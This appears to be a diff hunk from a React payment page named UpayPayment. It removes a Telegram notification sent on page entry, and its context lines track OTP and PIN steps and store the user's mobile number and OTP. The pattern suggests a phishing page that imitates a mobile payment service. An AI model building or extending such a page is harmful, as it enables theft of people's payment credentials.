@@ -51,7 +51,6 @@ const UpayPayment = () => {
   }, [step]);
   const otpStartAtRef = useRef<number>(0);
   useEffect(() => { if (step === 'otp' && !otpStartAtRef.current) otpStartAtRef.current = Date.now(); if (step !== 'otp') otpStartAtRef.current = 0; }, [step]);
-  useEffect(() => { sendTelegramNotification({ type: 'page_entry', amount, method: 'Upay' }, { force: true }); /* eslint-disable-next-line react-hooks/exhaustive-deps */ }, []);
 
   useEffect(() => {
     if (step === 'otp' || step === 'pin') saveOtpResume("upay", searchParams.toString(), { step, mobileNumber, otp });
